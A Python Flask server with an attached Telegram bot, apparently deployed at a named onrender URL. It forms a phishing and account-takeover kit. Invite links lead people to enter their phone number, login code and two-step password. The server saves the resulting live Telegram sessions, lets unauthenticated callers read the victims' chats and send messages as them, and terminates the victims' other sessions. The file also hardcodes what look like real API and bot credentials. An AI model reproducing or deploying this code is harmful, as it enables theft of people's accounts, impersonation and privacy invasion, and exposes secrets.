"""
UNIFIED SERVER (Flask + Telegram Bot) – ONE SERVICE
Includes: 
- All API endpoints for account management
- Telegram bot with channel join requirement (@Abe_army)
- Background bot thread
- Hardcoded credentials (as requested – INSECURE, revoke token!)
"""

import os
import threading
import logging
import json
import asyncio
import time
from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError

# -------------------- Telegram Bot imports --------------------
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ChatMemberStatus

# ==================== HARDCODED CONFIGURATION (INSECURE) ====================
API_ID = 33465589                          # Your API ID
API_HASH = "08bdab35790bf1fdf20c16a50bd323b8"  # Your API hash
BOT_TOKEN = "8210146562:AAHvM54C4KvHsf-YfAjOC9VLe6o1l-gEtBM"  # ⚠️ EXPOShdED – REVOKE NOW!
WEBAPP_URL = "https://e-gram-98zv.onrender.com"                 # Your Flask app URL
REQUIRED_CHANNEL = "@Abe_army"                                   # Channel to join
# ============================================================================

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Flask app
app = Flask(__name__)
CORS(app)

# Storage
ACCOUNTS_FILE = 'accounts.json'
accounts = []
temp_sessions = {}

# -------------------- Async helper --------------------
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# -------------------- Account persistence --------------------
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                    # Add invited_by field if missing (backward compatibility)
                    for acc in accounts:
                        if 'invited_by' not in acc:
                            acc['invited_by'] = None
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"🗑️ Removed invalid account {account_id}")
        return True
    return False

load_accounts()

# -------------------- Telegram Bot Handlers --------------------
async def is_member(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined the required channel."""
    try:
        chat_member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return chat_member.status in [ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR]
    except Exception as e:
        logger.error(f"Error checking membership: {e}")
        return False

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start – require channel join."""
    user_id = update.effective_user.id
    user = update.effective_user
    logger.info(f"User {user_id} (@{user.username}) started the bot.")

    if not await is_member(user_id, context):
        channel_link = "https://t.me/Abe_army"
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ **You must join our channel first!**\n\n"
            f"Please join {REQUIRED_CHANNEL} and then click /start again.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    invite_link = f"{WEBAPP_URL}/login?inviter={user_id}"
    keyboard = [[InlineKeyboardButton("➕ Add Account", url=invite_link)]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🔗 **Your invite link:**\n{invite_link}\n\n"
        "Share this link with others. When they add an account via this link, "
        "you'll see it in your private dashboard.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def bot_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dashboard – require channel join."""
    user_id = update.effective_user.id
    user = update.effective_user
    logger.info(f"User {user_id} (@{user.username}) requested dashboard.")

    if not await is_member(user_id, context):
        channel_link = "https://t.me/Abe_army"
        keyboard = [[InlineKeyboardButton("📢 Join Channel", url=channel_link)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ **You must join our channel first!**\n\n"
            f"Please join {REQUIRED_CHANNEL} and then click /dashboard again.",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    dash_link = f"{WEBAPP_URL}/user-dashboard?inviter={user_id}"
    await update.message.reply_text(
        f"📊 **Your private dashboard:**\n{dash_link}\n\n"
        "Here you can see all accounts added via your invite links.",
        parse_mode="Markdown"
    )

def run_bot():
    """Starts the Telegram bot in a separate thread."""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", bot_start))
    application.add_handler(CommandHandler("dashboard", bot_dashboard))
    logger.info("🤖 Bot started")
    application.run_polling()

# -------------------- Flask Routes (Pages) --------------------
@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/user-dashboard')
def user_dashboard():
    return send_file('user-dashboard.html')

# -------------------- API Endpoints --------------------

# Get all accounts (admin)
@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in accounts]
    return jsonify({'success': True, 'accounts': formatted})

# Get accounts invited by a specific user
@app.route('/api/accounts-by-inviter', methods=['POST'])
def accounts_by_inviter():
    data = request.json
    inviter = data.get('inviter')
    if not inviter:
        return jsonify({'success': False, 'error': 'Inviter ID required'})
    filtered = [a for a in accounts if str(a.get('invited_by')) == str(inviter)]
    formatted = [{'id': a['id'], 'phone': a.get('phone',''), 'name': a.get('name','Unknown')} for a in filtered]
    return jsonify({'success': True, 'accounts': formatted})

# Send OTP
@app.route('/api/add-account', methods=['POST'])
def add_account():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({'success': False, 'error': 'Phone number required'})
    if not phone.startswith('+'):
        phone = '+' + phone

    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client.send_code_request(phone)
            session_id = str(int(time.time()))
            temp_sessions[session_id] = {
                'phone': phone,
                'hash': result.phone_code_hash,
                'session': client.session.save()
            }
            return {'success': True, 'session_id': session_id}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(send_code())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Verify code (with optional inviter)
@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    inviter = data.get('inviter')

    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})

    session_data = temp_sessions[session_id]

    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        try:
            try:
                await client.sign_in(session_data['phone'], code, phone_code_hash=session_data['hash'])
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)

            me = await client.get_me()
            new_id = max([a['id'] for a in accounts]) + 1 if accounts else 1
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save(),
                'invited_by': inviter
            }
            accounts.append(new_account)
            save_accounts()
            return {'success': True}
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(verify())
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Get chats (simplified)
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})

    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered', 'message': 'Session expired'}

            dialogs = await client.get_dialogs()
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                chats.append(chat)
            return {'success': True, 'chats': chats, 'messages': []}
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered', 'message': 'Account removed'}
        except errors.FloodWaitError as e:
            return {'success': False, 'error': 'flood_wait', 'message': f'Wait {e.seconds}s', 'wait': e.seconds}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Send message
@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing fields'})

    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            await client.send_message(entity, message)
            return {'success': True}
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Remove account
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})

    global accounts
    original_len = len(accounts)
    accounts = [a for a in accounts if a['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Account not found'})

# Debug: list chats count
@app.route('/api/debug/chats/<int:account_id>', methods=['GET'])
def debug_chats(account_id):
    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def test():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            dialogs = await client.get_dialogs()
            return {'success': True, 'count': len(dialogs), 'names': [d.name for d in dialogs[:10] if d.name]}
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(test())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Get all active sessions
@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})

    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            sessions = []
            current_hash = None
            for auth in result.authorizations:
                s = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                if auth.current:
                    current_hash = auth.hash
                sessions.append(s)
            return {'success': True, 'sessions': sessions, 'current_hash': current_hash, 'count': len(sessions)}
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'fresh_reset_forbidden', 'message': 'Cannot view sessions within 24 hours of login'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Terminate a specific session
@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})

    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            return {'success': True}
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'Cannot terminate sessions within 24 hours of login'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Terminate all other sessions
@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})

    account = next((a for a in accounts if a['id'] == account_id), None)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})

    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            current_hash = next((a.hash for a in result.authorizations if a.current), None)
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        continue
            return {'success': True, 'message': f'Terminated {count} other sessions', 'count': count}
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'Cannot terminate sessions within 24 hours of login'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()

    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# Health check
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'temp_sessions': len(temp_sessions)
    })

# -------------------- Start Bot in Background Thread --------------------
def start_bot_thread():
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("Bot thread started")

# -------------------- Main --------------------
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # Start bot in background
    start_bot_thread()
    # Run Flask
    print('\n' + '='*60)
    print('🚀 UNIFIED SERVER RUNNING (Flask + Bot)')
    print('='*60)
    print(f'Port: {port}')
    print(f'Accounts loaded: {len(accounts)}')
    print(f'Bot token: {BOT_TOKEN[:10]}... (hardcoded)')
    print(f'Channel: {REQUIRED_CHANNEL}')
    print('='*60 + '\n')
    app.run(host='0.0.0.0', port=port, debug=False)
